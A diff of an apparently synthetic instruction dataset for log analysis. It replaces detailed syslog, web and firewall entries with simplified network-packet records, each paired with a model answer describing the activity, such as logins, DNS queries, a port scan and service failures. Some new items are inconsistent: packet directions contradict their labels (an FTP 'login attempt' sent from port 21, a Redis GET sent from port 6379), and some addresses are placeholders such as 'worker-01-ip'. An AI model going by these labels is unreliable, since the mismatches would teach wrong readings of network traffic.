@@ -5,7 +5,7 @@
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T09:30:22.000000",
+          "timestamp": "2023-03-15T09:30:22",
           "type": "syslog",
           "log_level": "INFO",
           "component": "sshd",
@@ -20,22 +20,26 @@
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T10:15:45.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "192.168.1.50 - - [15/Mar/2023:10:15:45 +0000] \"GET /index.html HTTP/1.1\" 200 1234",
-          "related_ip": "192.168.1.50"
+          "timestamp": "2023-03-15T10:15:45",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.1.50",
+          "dst_ip": "10.0.0.1",
+          "src_port": 12345,
+          "dst_port": 80,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 192.168.1.50 to 10.0.0.1:80"
         }
       ],
-      "output": "Normal HTTP GET request from IP 192.168.1.50 to access index.html, which returned successfully with status code 200 and response size 1234 bytes."
+      "output": "A TCP SYN packet was sent from 192.168.1.50 (port 12345) to 10.0.0.1 (port 80), initiating a connection."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T11:22:33.000000",
+          "timestamp": "2023-03-15T11:22:33",
           "type": "syslog",
           "log_level": "INFO",
           "component": "cron",
@@ -43,7 +47,7 @@
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-15T11:22:34.000000",
+          "timestamp": "2023-03-15T11:22:34",
           "type": "syslog",
           "log_level": "INFO",
           "component": "backup_script",
@@ -58,240 +62,419 @@
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T14:30:12.000000",
-          "type": "firewall",
-          "log_level": "INFO",
-          "component": "iptables",
-          "message": "ACCEPT tcp src=10.0.0.5 dst=10.0.0.10 sport=443 dport=80",
-          "related_ip": "10.0.0.5"
+          "timestamp": "2023-03-15T14:30:12",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "10.0.0.5",
+          "dst_ip": "8.8.8.8",
+          "src_port": 54321,
+          "dst_port": 53,
+          "message": "DNS query for example.com"
         }
       ],
-      "output": "Firewall allowed TCP connection from 10.0.0.5 port 443 to 10.0.0.10 port 80, indicating permitted web traffic."
+      "output": "A UDP DNS query for 'example.com' was sent from 10.0.0.5 (port 54321) to 8.8.8.8 (port 53)."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T16:45:20.000000",
-          "type": "database",
+          "timestamp": "2023-05-01T10:00:00",
+          "type": "syslog",
           "log_level": "INFO",
-          "component": "mysql",
-          "message": "Connect: user='webapp'@'10.0.1.50' on database 'ecommerce'",
-          "related_ip": "10.0.1.50"
+          "component": "auth",
+          "message": "User 'johndoe' logged in from 192.168.1.10",
+          "related_ip": "192.168.1.10"
+        },
+        {
+          "timestamp": "2023-05-01T10:00:05",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.1.10",
+          "dst_ip": "10.0.0.5",
+          "src_port": 54321,
+          "dst_port": 80,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 192.168.1.10 to 10.0.0.5:80"
         }
       ],
-      "output": "Database connection established: User 'webapp' from IP 10.0.1.50 successfully connected to MySQL database 'ecommerce'."
+      "output": "User 'johndoe' logged in, followed by a TCP SYN packet from their IP to an internal server, indicating web access after login."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T08:15:30.000000",
-          "type": "dns",
+          "timestamp": "2023-03-15T16:45:20",
+          "type": "syslog",
           "log_level": "INFO",
-          "component": "named",
-          "message": "client 192.168.1.25: query: api.company.com IN A +",
-          "related_ip": "192.168.1.25"
+          "component": "kernel",
+          "message": "New device detected: sda1",
+          "related_ip": null
         }
       ],
-      "output": "DNS query from client 192.168.1.25 requesting A record for domain api.company.com."
+      "output": "A new storage device, sda1, has been detected by the kernel."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T12:00:00.000000",
-          "type": "mail",
+          "timestamp": "2023-03-15T08:15:30",
+          "type": "network_packet",
+          "protocol": "ICMP",
+          "src_ip": "192.168.1.25",
+          "dst_ip": "192.168.1.1",
+          "message": "ICMP echo request from 192.168.1.25 to 192.168.1.1"
+        }
+      ],
+      "output": "An ICMP echo request (ping) was sent from 192.168.1.25 to 192.168.1.1."
+    },
+    {
+      "type": "basic_analysis",
+      "instruction": "Analyze the following log entries and describe what activities are taking place.",
+      "input": [
+        {
+          "timestamp": "2023-03-15T12:00:00",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "postfix",
-          "message": "to=user@example.com, relay=mail.example.com[203.0.113.10]:25, status=sent (250 2.0.0 Ok: queued as 12345ABCDE)",
-          "related_ip": "203.0.113.10"
+          "message": "mail sent to user@example.com",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-15T12:00:05",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "10.0.0.10",
+          "dst_ip": "203.0.113.10",
+          "src_port": 25,
+          "dst_port": 54321,
+          "flags": "ACK",
+          "length": 52,
+          "message": "TCP ACK packet from 10.0.0.10 to 203.0.113.10:54321"
         }
       ],
-      "output": "Email delivery: Message successfully sent to user@example.com via relay server mail.example.com with confirmation queue ID 12345ABCDE."
+      "output": "An email was sent, followed by a TCP ACK packet, indicating successful mail transfer."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T13:45:10.000000",
-          "type": "vpn",
+          "timestamp": "2023-03-15T13:45:10",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "openvpn",
-          "message": "employee1/203.0.113.75:1194 MULTI_sva: pool returned IPv4=10.8.0.6, IPv6=(Not enabled)",
+          "message": "client connected from 203.0.113.75",
           "related_ip": "203.0.113.75"
         }
       ],
-      "output": "VPN IP assignment: Client employee1 from external IP 203.0.113.75 was assigned internal VPN IP address 10.8.0.6."
+      "output": "A client successfully connected to the OpenVPN server from IP address 203.0.113.75."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T17:30:55.000000",
-          "type": "web_app",
-          "log_level": "INFO",
-          "component": "nginx",
-          "message": "192.168.1.80 - - [15/Mar/2023:17:30:55 +0000] \"POST /api/v1/users/login HTTP/1.1\" 200 245 0.150",
-          "related_ip": "192.168.1.80"
+          "timestamp": "2023-03-15T17:30:55",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.80",
+          "dst_ip": "10.0.0.2",
+          "src_port": 54322,
+          "dst_port": 80,
+          "message": "HTTP GET /index.html"
         }
       ],
-      "output": "API login request: User from IP 192.168.1.80 successfully authenticated via POST request to /api/v1/users/login endpoint, processed in 0.150 seconds."
+      "output": "An HTTP GET request for /index.html was made from 192.168.1.80 to 10.0.0.2."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T19:15:30.000000",
-          "type": "proxy",
+          "timestamp": "2023-03-15T19:15:30",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "squid",
-          "message": "TCP_MISS/200 3456 GET http://cdn.example.com/images/logo.png - DIRECT/198.51.100.25 image/png",
-          "related_ip": "198.51.100.25"
+          "message": "TCP_MISS/200 GET http://example.com/image.jpg",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-15T19:15:35",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "10.0.0.3",
+          "dst_ip": "198.51.100.25",
+          "src_port": 8080,
+          "dst_port": 80,
+          "message": "HTTP GET /image.jpg"
         }
       ],
-      "output": "Proxy cache miss: Squid proxy fetched logo.png image directly from CDN server 198.51.100.25 as it was not found in cache."
+      "output": "A Squid proxy reported a cache miss for an image, followed by an HTTP GET request for that image to an external server."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T20:45:12.000000",
-          "type": "ftp",
+          "timestamp": "2023-03-15T20:45:12",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "vsftpd",
-          "message": "OK UPLOAD: Client \"192.168.1.90\", \"/uploads/report.pdf\", 2097152 bytes, 1.25Kbyte/sec",
+          "message": "OK UPLOAD: Client \"192.168.1.90\", \"/uploads/file.txt\"",
           "related_ip": "192.168.1.90"
         }
       ],
-      "output": "FTP file upload: Client 192.168.1.90 successfully uploaded report.pdf (2MB) to /uploads/ directory at 1.25KB/sec transfer rate."
+      "output": "A file was successfully uploaded via FTP by client 192.168.1.90 to /uploads/file.txt."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T21:30:00.000000",
-          "type": "monitoring",
-          "log_level": "INFO",
-          "component": "nagios",
-          "message": "SERVICE ALERT: web-server;HTTP;OK;HARD;1;HTTP OK: HTTP/1.1 200 OK - 0.234 second response time",
-          "related_ip": null
+          "timestamp": "2023-03-15T21:30:00",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "10.0.0.100",
+          "dst_ip": "10.0.0.1",
+          "src_port": 80,
+          "dst_port": 54323,
+          "flags": "ACK",
+          "length": 52,
+          "message": "TCP ACK packet from 10.0.0.100 to 10.0.0.1:54323"
         }
       ],
-      "output": "Service monitoring: Nagios health check confirmed web-server HTTP service is operational with 0.234 second response time."
+      "output": "A TCP ACK packet was sent from 10.0.0.100 (port 80) to 10.0.0.1 (port 54323), indicating continuation of a connection."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T07:00:15.000000",
-          "type": "storage",
+          "timestamp": "2023-03-15T07:00:15",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "nfs",
-          "message": "authenticated mount request from 10.0.2.15:755 for /shared/documents (/shared/documents)",
+          "message": "mount request from 10.0.2.15",
           "related_ip": "10.0.2.15"
+        },
+        {
+          "timestamp": "2023-03-15T07:00:20",
+          "type": "network_packet",
+          "protocol": "NFS",
+          "src_ip": "10.0.2.15",
+          "dst_ip": "10.0.2.1",
+          "src_port": 2049,
+          "dst_port": 2049,
+          "message": "NFS Mount request from 10.0.2.15"
         }
       ],
-      "output": "NFS mount operation: Client 10.0.2.15 successfully mounted network file system /shared/documents after authentication."
+      "output": "An NFS mount request was logged from 10.0.2.15, followed by an NFS mount packet from the same IP, indicating a network file system access attempt."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T18:22:40.000000",
-          "type": "load_balancer",
+          "timestamp": "2023-03-15T18:22:40",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "haproxy",
-          "message": "Server backend1/web1 is UP, reason: Layer4 check passed, check duration: 2ms",
+          "message": "Server web1 is UP",
           "related_ip": null
         }
       ],
-      "output": "Load balancer health check: HAProxy confirmed backend server web1 is healthy and available, passing Layer4 connectivity test in 2ms."
+      "output": "HAProxy reported that server web1 is now operational."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T22:10:30.000000",
-          "type": "container",
-          "log_level": "INFO",
-          "component": "docker",
-          "message": "Container webapp_1 started with ID 1a2b3c4d5e6f and mapped to port 8080:80",
-          "related_ip": null
+          "timestamp": "2023-03-15T22:10:30",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "10.0.0.20",
+          "dst_ip": "10.0.0.30",
+          "src_port": 8080,
+          "dst_port": 80,
+          "message": "HTTP POST /api/data"
         }
       ],
-      "output": "Container deployment: Docker container webapp_1 successfully started with ID 1a2b3c4d5e6f, exposing internal port 80 via host port 8080."
+      "output": "An HTTP POST request to /api/data was made from 10.0.0.20 (port 8080) to 10.0.0.30 (port 80)."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T06:30:45.000000",
-          "type": "certificate",
+          "timestamp": "2023-03-15T06:30:45",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "certbot",
-          "message": "Successfully deployed certificate for api.company.com to /etc/nginx/ssl/",
+          "message": "Certificate renewed for example.com",
           "related_ip": null
         }
       ],
-      "output": "SSL certificate deployment: Certbot successfully installed SSL certificate for api.company.com domain to nginx SSL directory."
+      "output": "The SSL certificate for example.com has been successfully renewed by Certbot."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T23:45:20.000000",
-          "type": "backup",
-          "log_level": "INFO",
-          "component": "rsync",
-          "message": "sent 104,857,600 bytes  received 2,048 bytes  4,194,305.60 bytes/sec, total size is 5,368,709,120",
-          "related_ip": null
+          "timestamp": "2023-03-15T23:45:20",
+          "type": "network_packet",
+          "protocol": "FTP",
+          "src_ip": "192.168.1.10",
+          "dst_ip": "10.0.0.50",
+          "src_port": 21,
+          "dst_port": 54324,
+          "message": "FTP login attempt from 192.168.1.10"
         }
       ],
-      "output": "Backup synchronization: Rsync completed data transfer of 104MB at 4.19MB/sec speed, synchronizing total 5.36GB of data."
+      "output": "An FTP login attempt was made from 192.168.1.10 to 10.0.0.50."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T11:55:10.000000",
-          "type": "cache",
+          "timestamp": "2023-03-15T11:55:10",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "redis",
-          "message": "DB 0: 15432 keys (1 volatile) in 32768 slots HT.",
+          "message": "DB 0: 10000 keys in 16384 slots HT.",
           "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-15T11:55:15",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "10.0.0.60",
+          "dst_ip": "10.0.0.70",
+          "src_port": 6379,
+          "dst_port": 54325,
+          "flags": "PSH,ACK",
+          "length": 120,
+          "message": "Redis GET key_name"
         }
       ],
-      "output": "Cache statistics: Redis database 0 contains 15,432 keys with 1 volatile key, using 32,768 hash table slots."
+      "output": "Redis reported its database status, followed by a network packet indicating a Redis GET command, suggesting active cache usage."
     },
     {
       "type": "basic_analysis",
       "instruction": "Analyze the following log entries and describe what activities are taking place.",
       "input": [
         {
-          "timestamp": "2023-03-15T14:20:35.000000",
-          "type": "queue",
+          "timestamp": "2023-03-15T14:20:35",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "rabbitmq",
-          "message": "accepting AMQP connection <0.678.0> (192.168.1.110:54321 -> 192.168.1.1:5672)",
+          "message": "accepting AMQP connection from 192.168.1.110",
           "related_ip": "192.168.1.110"
         }
       ],
-      "output": "Message queue connection: RabbitMQ accepted AMQP connection from client 192.168.1.110 port 54321 to server port 5672."
+      "output": "RabbitMQ accepted an AMQP connection from 192.168.1.110."
+    },
+    {
+      "type": "basic_analysis",
+      "instruction": "Analyze the following log entries and describe what activities are taking place.",
+      "input": [
+        {
+          "timestamp": "2023-03-15T09:00:00",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "systemd",
+          "message": "Starting Apache HTTP Server.",
+          "related_ip": null
+        }
+      ],
+      "output": "The Apache HTTP Server is being started by systemd."
+    },
+    {
+      "type": "basic_analysis",
+      "instruction": "Analyze the following log entries and describe what activities are taking place.",
+      "input": [
+        {
+          "timestamp": "2023-03-15T09:00:05",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "10.0.0.1",
+          "dst_ip": "10.0.0.2",
+          "src_port": 80,
+          "dst_port": 8080,
+          "flags": "SYN,ACK",
+          "length": 60,
+          "message": "TCP SYN-ACK packet from 10.0.0.1 to 10.0.0.2:8080"
+        }
+      ],
+      "output": "A TCP SYN-ACK packet was sent from 10.0.0.1 (port 80) to 10.0.0.2 (port 8080), indicating a successful connection establishment."
+    },
+    {
+      "type": "basic_analysis",
+      "instruction": "Analyze the following log entries and describe what activities are taking place.",
+      "input": [
+        {
+          "timestamp": "2023-03-15T09:00:10",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "nginx",
+          "message": "Worker process 1234 started",
+          "related_ip": null
+        }
+      ],
+      "output": "An Nginx worker process with PID 1234 has successfully started."
+    },
+    {
+      "type": "basic_analysis",
+      "instruction": "Analyze the following log entries and describe what activities are taking place.",
+      "input": [
+        {
+          "timestamp": "2023-03-15T09:00:15",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "192.168.1.1",
+          "dst_ip": "192.168.1.255",
+          "src_port": 137,
+          "dst_port": 137,
+          "message": "NetBIOS Name Service query"
+        }
+      ],
+      "output": "A NetBIOS Name Service query was broadcast from 192.168.1.1, likely for network discovery."
+    },
+    {
+      "type": "basic_analysis",
+      "instruction": "Analyze the following log entries and describe what activities are taking place.",
+      "input": [
+        {
+          "timestamp": "2023-03-15T09:00:20",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "kernel",
+          "message": "CPU temperature high: 85C",
+          "related_ip": null
+        }
+      ],
+      "output": "The kernel reported a high CPU temperature of 85 degrees Celsius, indicating potential overheating."
+    },
+    {
+      "type": "basic_analysis",
+      "instruction": "Analyze the following log entries and describe what activities are taking place.",
+      "input": [
+        {
+          "timestamp": "2023-03-15T09:00:25",
+          "type": "network_packet",
+          "protocol": "ARP",
+          "src_ip": "192.168.1.10",
+          "dst_ip": "0.0.0.0",
+          "message": "ARP request: Who has 192.168.1.1? Tell 192.168.1.10"
+        }
+      ],
+      "output": "An ARP request was sent from 192.168.1.10 to discover the MAC address of 192.168.1.1."
     }
   ],
   "advanced_analysis": [
@@ -300,7 +483,7 @@
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T02:15:30.000000",
+          "timestamp": "2023-03-20T02:15:30",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "sshd",
@@ -308,7 +491,7 @@
           "related_ip": "203.0.113.100"
         },
         {
-          "timestamp": "2023-03-20T02:15:35.000000",
+          "timestamp": "2023-03-20T02:15:35",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "sshd",
@@ -316,7 +499,7 @@
           "related_ip": "203.0.113.100"
         },
         {
-          "timestamp": "2023-03-20T02:15:40.000000",
+          "timestamp": "2023-03-20T02:15:40",
           "type": "syslog",
           "log_level": "WARNING",
           "component": "sshd",
@@ -331,527 +514,1615 @@
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T14:30:10.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "192.168.1.75 - - [20/Mar/2023:14:30:10 +0000] \"GET /wp-admin/admin-ajax.php HTTP/1.1\" 200 45",
-          "related_ip": "192.168.1.75"
+          "timestamp": "2023-03-20T09:45:20",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "198.51.100.50",
+          "dst_ip": "10.0.0.5",
+          "src_port": 10000,
+          "dst_port": 443,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 198.51.100.50 to 10.0.0.5:443"
         },
         {
-          "timestamp": "2023-03-20T14:30:12.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "192.168.1.75 - - [20/Mar/2023:14:30:12 +0000] \"POST /wp-admin/admin-post.php HTTP/1.1\" 302 0",
-          "related_ip": "192.168.1.75"
+          "timestamp": "2023-03-20T09:45:22",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "198.51.100.50",
+          "dst_ip": "10.0.0.5",
+          "src_port": 10001,
+          "dst_port": 80,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 198.51.100.50 to 10.0.0.5:80"
         },
         {
-          "timestamp": "2023-03-20T14:30:15.000000",
-          "type": "database",
-          "log_level": "INFO",
-          "component": "mysql",
-          "message": "Query: INSERT INTO wp_posts (post_title, post_content, post_status) VALUES ('New Article', 'Content here', 'publish')",
-          "related_ip": null
+          "timestamp": "2023-03-20T09:45:25",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "198.51.100.50",
+          "dst_ip": "10.0.0.5",
+          "src_port": 10002,
+          "dst_port": 22,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 198.51.100.50 to 10.0.0.5:22"
         }
       ],
-      "output": "WordPress content management activity: User from 192.168.1.75 successfully published new content through WordPress admin interface, involving AJAX calls, form submission, and database insertion."
+      "output": "Port scanning activity detected: External IP 198.51.100.50 attempting to probe common service ports (HTTPS, HTTP, SSH) on internal server 10.0.0.5."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T09:45:20.000000",
-          "type": "firewall",
-          "log_level": "WARNING",
-          "component": "iptables",
-          "message": "DROP tcp src=198.51.100.50 dst=10.0.0.5 dport=443",
-          "related_ip": "198.51.100.50"
-        },
-        {
-          "timestamp": "2023-03-20T09:45:22.000000",
-          "type": "firewall",
-          "log_level": "WARNING",
-          "component": "iptables",
-          "message": "DROP tcp src=198.51.100.50 dst=10.0.0.5 dport=80",
-          "related_ip": "198.51.100.50"
-        },
-        {
-          "timestamp": "2023-03-20T09:45:25.000000",
-          "type": "firewall",
-          "log_level": "WARNING",
-          "component": "iptables",
-          "message": "DROP tcp src=198.51.100.50 dst=10.0.0.5 dport=22",
-          "related_ip": "198.51.100.50"
-        }
-      ],
-      "output": "Port scanning activity detected: External IP 198.51.100.50 attempting to probe common service ports (HTTPS, HTTP, SSH) on internal server 10.0.0.5, blocked by firewall rules."
-    },
-    {
-      "type": "advanced_analysis",
-      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
-      "input": [
-        {
-          "timestamp": "2023-03-20T16:20:00.000000",
+          "timestamp": "2023-05-02T11:00:00",
           "type": "syslog",
           "log_level": "ERROR",
           "component": "kernel",
-          "message": "Out of memory: Kill process 1234 (apache2) score 950 or sacrifice child",
+          "message": "Out of memory: Kill process 1234 (webserver)",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T16:20:01.000000",
-          "type": "syslog",
-          "log_level": "INFO",
-          "component": "systemd",
-          "message": "apache2.service: Main process exited, code=killed, status=9/KILL",
-          "related_ip": null
+          "timestamp": "2023-05-02T11:00:05",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.1.20",
+          "dst_ip": "10.0.0.10",
+          "src_port": 44332,
+          "dst_port": 80,
+          "flags": "RST",
+          "length": 40,
+          "message": "TCP RST packet from 192.168.1.20 to 10.0.0.10:80"
         },
         {
-          "timestamp": "2023-03-20T16:20:05.000000",
+          "timestamp": "2023-05-02T11:00:10",
           "type": "syslog",
           "log_level": "INFO",
           "component": "systemd",
-          "message": "apache2.service: Activating auto-restart (restart count: 1)",
+          "message": "webserver.service: Main process exited, code=killed",
           "related_ip": null
         }
       ],
-      "output": "Memory exhaustion incident: System ran out of memory, triggering OOM killer to terminate Apache process, followed by automatic service restart mechanism."
+      "output": "Webserver crashed due to out-of-memory, leading to TCP RST packets for ongoing connections and subsequent service termination, indicating a critical service interruption."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T11:30:45.000000",
-          "type": "load_balancer",
+          "timestamp": "2023-03-20T11:30:45",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "haproxy",
-          "message": "Server backend1/web1 is DOWN, reason: Layer4 connection problem, info: Connection refused",
+          "message": "Server backend1/web1 is DOWN",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T11:30:50.000000",
-          "type": "load_balancer",
+          "timestamp": "2023-03-20T11:30:50",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "haproxy",
-          "message": "Server backend1/web2 is UP (via agent), 1 active and 0 backup servers online",
+          "message": "Server backend1/web2 is UP",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T11:30:55.000000",
-          "type": "apache",
-          "log_level": "INFO",
-          "component": "access",
-          "message": "192.168.1.50 - - [20/Mar/2023:11:30:55 +0000] \"GET /index.html HTTP/1.1\" 200 1234",
-          "related_ip": "192.168.1.50"
+          "timestamp": "2023-03-20T11:30:55",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.50",
+          "dst_ip": "10.0.0.10",
+          "src_port": 54326,
+          "dst_port": 80,
+          "message": "HTTP GET /index.html"
         }
       ],
-      "output": "Load balancer failover: Primary web server (web1) went down due to connection issues, traffic automatically redirected to backup server (web2), maintaining service availability."
+      "output": "Load balancer failover: Primary web server (web1) went down, traffic automatically redirected to backup server (web2), maintaining service availability as evidenced by a successful HTTP GET request."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T19:15:10.000000",
-          "type": "database",
+          "timestamp": "2023-03-20T19:15:10",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "mysql",
-          "message": "Slow query logged: SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE region='US') - Duration: 45.2s",
+          "message": "Slow query logged: SELECT * FROM large_table",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T19:15:20.000000",
-          "type": "application",
+          "timestamp": "2023-03-20T19:15:20",
+          "type": "syslog",
           "log_level": "ERROR",
-          "component": "ecommerce_app",
-          "message": "Database timeout: Query execution exceeded 30 second limit",
+          "component": "application",
+          "message": "Database connection timeout",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T19:15:25.000000",
-          "type": "apache",
-          "log_level": "ERROR",
-          "component": "access",
-          "message": "192.168.1.50 - - [20/Mar/2023:19:15:25 +0000] \"GET /orders/dashboard HTTP/1.1\" 500 1024",
-          "related_ip": "192.168.1.50"
+          "timestamp": "2023-03-20T19:15:25",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.1.50",
+          "dst_ip": "10.0.0.10",
+          "src_port": 54327,
+          "dst_port": 3306,
+          "flags": "RST",
+          "length": 40,
+          "message": "TCP RST packet from 192.168.1.50 to 10.0.0.10:3306"
         }
       ],
-      "output": "Database performance issue: Slow-running query with nested subselect caused timeout, resulting in application errors and HTTP 500 responses for order dashboard functionality."
+      "output": "Database performance issue: A slow query led to application database connection timeouts, resulting in TCP RST packets, indicating a service disruption."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T13:00:00.000000",
-          "type": "container",
+          "timestamp": "2023-03-20T13:00:00",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "kubernetes",
-          "message": "Pod 'webapp-deployment-7d9f8b6c4-xyz123' scheduled on node 'worker-01'",
+          "message": "Pod 'webapp' scheduled on node 'worker-01'",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T13:00:15.000000",
-          "type": "container",
+          "timestamp": "2023-03-20T13:00:15",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "kubernetes",
-          "message": "Pod 'webapp-deployment-7d9f8b6c4-xyz123' failed to pull image: registry timeout",
+          "message": "Failed to pull image: registry timeout",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T13:00:30.000000",
-          "type": "container",
-          "log_level": "ERROR",
-          "component": "kubernetes",
-          "message": "Pod 'webapp-deployment-7d9f8b6c4-xyz123' status changed to 'ImagePullBackOff'",
-          "related_ip": null
+          "timestamp": "2023-03-20T13:00:30",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "worker-01-ip",
+          "dst_ip": "image-registry-ip",
+          "src_port": 40000,
+          "dst_port": 5000,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from worker-01 to image registry:5000"
         }
       ],
-      "output": "Container deployment failure: Kubernetes pod scheduled successfully but failed to start due to container registry timeout, entering ImagePullBackOff state requiring intervention."
+      "output": "Container deployment failure: Kubernetes pod failed to pull image due to a registry timeout, indicated by a failed image pull log and a TCP SYN packet to the image registry that likely received no response."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T08:30:15.000000",
-          "type": "cdn",
-          "log_level": "INFO",
-          "component": "cloudflare",
-          "message": "Cache HIT: GET /static/app.js - Origin: not contacted",
-          "related_ip": null
+          "timestamp": "2023-03-20T08:30:15",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "client-ip",
+          "dst_ip": "cdn-ip",
+          "src_port": 54328,
+          "dst_port": 80,
+          "message": "HTTP GET /static/app.js"
         },
         {
-          "timestamp": "2023-03-20T08:30:20.000000",
-          "type": "cdn",
+          "timestamp": "2023-03-20T08:30:20",
+          "type": "syslog",
           "log_level": "WARNING",
-          "component": "cloudflare",
+          "component": "cdn",
           "message": "Cache MISS: GET /api/v1/data - Origin response: 504 Gateway Timeout",
           "related_ip": null
         },
